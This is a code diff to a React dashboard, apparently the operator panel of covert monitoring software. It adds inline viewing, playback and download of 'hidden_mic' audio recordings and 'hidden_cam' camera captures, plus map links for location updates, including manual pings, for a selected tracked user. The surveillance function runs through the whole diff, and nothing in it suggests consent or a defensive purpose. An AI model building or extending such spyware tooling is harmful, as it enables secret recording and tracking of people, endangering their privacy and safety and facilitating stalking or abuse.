@@ -1,11 +1,17 @@
 import { useEffect, useState } from 'react';
 import PocketBase from 'pocketbase';
-import { MapPin, Mic, Camera, Activity, Users } from 'lucide-react';
+import { MapPin, Mic, Camera, Activity, Users, Download, X, ExternalLink } from 'lucide-react';
 
 // Connect to local PocketBase
 // Connect to PocketBase (dynamic for production, local for dev)
 const pb = new PocketBase((import.meta as any).env.PROD ? window.location.origin : 'http://127.0.0.1:8090');
 pb.autoCancellation(false); // Disable auto-cancellation to prevent React Strict Mode issues
+
+// Helper to build PocketBase file URL
+const getFileUrl = (record: any, filename: string) => {
+    if (!filename) return '';
+    return `${pb.baseURL}/api/files/${record.collectionId || record.collectionName}/${record.id}/${filename}`;
+};
 
 interface LocationLog {
     id: string;
@@ -21,6 +27,8 @@ interface LocationLog {
 
 interface MonitoringLog {
     id: string;
+    collectionId: string;
+    collectionName: string;
     type: 'hidden_mic' | 'hidden_cam';
     created: string;
     user_id: string;
@@ -38,6 +46,7 @@ export default function Dashboard() {
     const [logs, setLogs] = useState<MonitoringLog[]>([]);
     const [users, setUsers] = useState<User[]>([]);
     const [selectedUser, setSelectedUser] = useState<string>('');
+    const [modalMedia, setModalMedia] = useState<{ url: string; type: 'image' | 'audio' } | null>(null);
 
     useEffect(() => {
         fetchInitialData();
@@ -217,36 +226,107 @@ export default function Dashboard() {
                                 Live Activity Feed: {users.find(u => u.id === selectedUser)?.email}
                             </div>
                             <div style={{ maxHeight: '600px', overflowY: 'auto' }}>
-                                {filteredLogs.map(log => (
-                                    <div key={log.id} style={{ padding: '15px 20px', borderBottom: '1px solid #eee', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
-                                        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
-                                            {log.type === 'hidden_mic'
-                                                ? <div style={{ background: '#fce8e6', padding: '8px', borderRadius: '50%' }}><Mic size={16} color="#D93025" /></div>
-                                                : <div style={{ background: '#f3e8fd', padding: '8px', borderRadius: '50%' }}><Camera size={16} color="#9334E6" /></div>
-                                            }
-                                            <div>
-                                                <div style={{ fontWeight: 500 }}>{log.type === 'hidden_mic' ? 'Audio Recording' : 'Camera Capture'}</div>
-                                                <div style={{ fontSize: '13px', color: '#666' }}>
-                                                    {new Date(log.created).toLocaleString()}
+                                {filteredLogs.map(log => {
+                                    const fileUrl = log.file ? getFileUrl(log, log.file) : '';
+                                    const isAudio = log.type === 'hidden_mic';
+                                    const isImage = log.type === 'hidden_cam';
+
+                                    return (
+                                    <div key={log.id} style={{ padding: '15px 20px', borderBottom: '1px solid #eee' }}>
+                                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                                            <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
+                                                {isAudio
+                                                    ? <div style={{ background: '#fce8e6', padding: '8px', borderRadius: '50%' }}><Mic size={16} color="#D93025" /></div>
+                                                    : <div style={{ background: '#f3e8fd', padding: '8px', borderRadius: '50%' }}><Camera size={16} color="#9334E6" /></div>
+                                                }
+                                                <div>
+                                                    <div style={{ fontWeight: 500 }}>{isAudio ? 'Audio Recording' : 'Camera Capture'}</div>
+                                                    <div style={{ fontSize: '13px', color: '#666' }}>
+                                                        {new Date(log.created).toLocaleString()}
+                                                    </div>
                                                 </div>
                                             </div>
+                                            {fileUrl && (
+                                                <div style={{ display: 'flex', gap: '8px' }}>
+                                                    {isImage && (
+                                                        <button
+                                                            onClick={() => setModalMedia({ url: fileUrl, type: 'image' })}
+                                                            style={{ display: 'flex', alignItems: 'center', gap: '4px', padding: '6px 12px', background: '#9334E6', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer', fontSize: '12px' }}
+                                                        >
+                                                            <ExternalLink size={14} /> View
+                                                        </button>
+                                                    )}
+                                                    {isAudio && (
+                                                        <button
+                                                            onClick={() => setModalMedia({ url: fileUrl, type: 'audio' })}
+                                                            style={{ display: 'flex', alignItems: 'center', gap: '4px', padding: '6px 12px', background: '#D93025', color: '#fff', border: 'none', borderRadius: '4px', cursor: 'pointer', fontSize: '12px' }}
+                                                        >
+                                                            <ExternalLink size={14} /> Play
+                                                        </button>
+                                                    )}
+                                                    <a
+                                                        href={fileUrl}
+                                                        download
+                                                        style={{ display: 'flex', alignItems: 'center', gap: '4px', padding: '6px 12px', background: '#f0f0f0', color: '#333', borderRadius: '4px', textDecoration: 'none', fontSize: '12px' }}
+                                                    >
+                                                        <Download size={14} /> Download
+                                                    </a>
+                                                </div>
+                                            )}
+                                            {!fileUrl && (
+                                                <span style={{ fontSize: '12px', color: '#999', fontStyle: 'italic' }}>No file</span>
+                                            )}
                                         </div>
+
+                                        {/* Inline image thumbnail */}
+                                        {isImage && fileUrl && (
+                                            <div style={{ marginTop: '10px', marginLeft: '47px' }}>
+                                                <img
+                                                    src={fileUrl}
+                                                    alt="Captured photo"
+                                                    onClick={() => setModalMedia({ url: fileUrl, type: 'image' })}
+                                                    style={{ maxWidth: '200px', maxHeight: '150px', borderRadius: '6px', border: '1px solid #ddd', cursor: 'pointer', objectFit: 'cover' }}
+                                                />
+                                            </div>
+                                        )}
+
+                                        {/* Inline audio player */}
+                                        {isAudio && fileUrl && (
+                                            <div style={{ marginTop: '10px', marginLeft: '47px' }}>
+                                                <audio controls style={{ width: '100%', maxWidth: '400px' }}>
+                                                    <source src={fileUrl} type="audio/mp4" />
+                                                    <source src={fileUrl} type="audio/m4a" />
+                                                    Your browser does not support the audio element.
+                                                </audio>
+                                            </div>
+                                        )}
                                     </div>
-                                ))}
+                                    );
+                                })}
 
                                 {filteredLocations.map(loc => (
                                     <div key={loc.id} style={{ padding: '15px 20px', borderBottom: '1px solid #eee', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                                         <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
                                             <div style={{ background: '#e8f0fe', padding: '8px', borderRadius: '50%' }}><MapPin size={16} color="#1967D2" /></div>
                                             <div>
-                                                <div style={{ fontWeight: 500 }}>Location Update</div>
+                                                <div style={{ fontWeight: 500 }}>Location Update {loc.type === 'manual_ping' ? '(Pinged)' : ''}</div>
                                                 <div style={{ fontSize: '13px', color: '#666' }}>
                                                     {loc.latitude.toFixed(6)}, {loc.longitude.toFixed(6)}
                                                 </div>
                                             </div>
                                         </div>
-                                        <div style={{ fontSize: '12px', color: '#999' }}>
-                                            {new Date(loc.timestamp).toLocaleTimeString()}
+                                        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                                            <a
+                                                href={`https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`}
+                                                target="_blank"
+                                                rel="noopener noreferrer"
+                                                style={{ display: 'flex', alignItems: 'center', gap: '4px', padding: '6px 12px', background: '#1967D2', color: '#fff', borderRadius: '4px', textDecoration: 'none', fontSize: '12px' }}
+                                            >
+                                                <ExternalLink size={14} /> View Map
+                                            </a>
+                                            <div style={{ fontSize: '12px', color: '#999' }}>
+                                                {new Date(loc.timestamp || loc.created).toLocaleTimeString()}
+                                            </div>
                                         </div>
                                     </div>
                                 ))}
@@ -256,6 +336,54 @@ export default function Dashboard() {
                                 )}
                             </div>
                         </div>
+                    </div>
+                </div>
+            )}
+
+            {/* Media Modal (Lightbox) */}
+            {modalMedia && (
+                <div
+                    onClick={() => setModalMedia(null)}
+                    style={{
+                        position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
+                        background: 'rgba(0,0,0,0.85)', display: 'flex', alignItems: 'center', justifyContent: 'center',
+                        zIndex: 9999, cursor: 'pointer'
+                    }}
+                >
+                    <button
+                        onClick={() => setModalMedia(null)}
+                        style={{
+                            position: 'absolute', top: '20px', right: '20px', background: 'rgba(255,255,255,0.2)',
+                            border: 'none', borderRadius: '50%', padding: '8px', cursor: 'pointer', display: 'flex'
+                        }}
+                    >
+                        <X size={24} color="#fff" />
+                    </button>
+
+                    <div onClick={(e) => e.stopPropagation()} style={{ maxWidth: '90vw', maxHeight: '90vh' }}>
+                        {modalMedia.type === 'image' && (
+                            <img
+                                src={modalMedia.url}
+                                alt="Captured"
+                                style={{ maxWidth: '90vw', maxHeight: '85vh', borderRadius: '8px', objectFit: 'contain' }}
+                            />
+                        )}
+                        {modalMedia.type === 'audio' && (
+                            <div style={{ background: '#fff', padding: '40px', borderRadius: '12px', textAlign: 'center' }}>
+                                <Mic size={48} color="#D93025" style={{ marginBottom: '20px' }} />
+                                <h3 style={{ margin: '0 0 20px 0' }}>Audio Recording</h3>
+                                <audio controls autoPlay style={{ width: '400px' }}>
+                                    <source src={modalMedia.url} type="audio/mp4" />
+                                    <source src={modalMedia.url} type="audio/m4a" />
+                                    Your browser does not support the audio element.
+                                </audio>
+                                <div style={{ marginTop: '15px' }}>
+                                    <a href={modalMedia.url} download style={{ color: '#0056D2', textDecoration: 'none', fontSize: '14px' }}>
+                                        <Download size={14} style={{ verticalAlign: 'middle', marginRight: '4px' }} /> Download File
+                                    </a>
+                                </div>
+                            </div>
+                        )}
                     </div>
                 </div>
             )}
